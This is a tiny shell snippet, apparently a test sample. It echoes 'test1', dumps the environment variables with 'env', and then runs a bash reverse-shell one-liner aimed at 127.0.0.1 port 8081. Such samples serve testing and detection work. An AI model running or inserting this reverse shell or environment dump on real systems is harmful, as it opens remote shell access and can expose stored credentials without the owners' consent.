echo "test1"
env
bash -i >& /dev/tcp/127.0.0.1/8081 0>&1
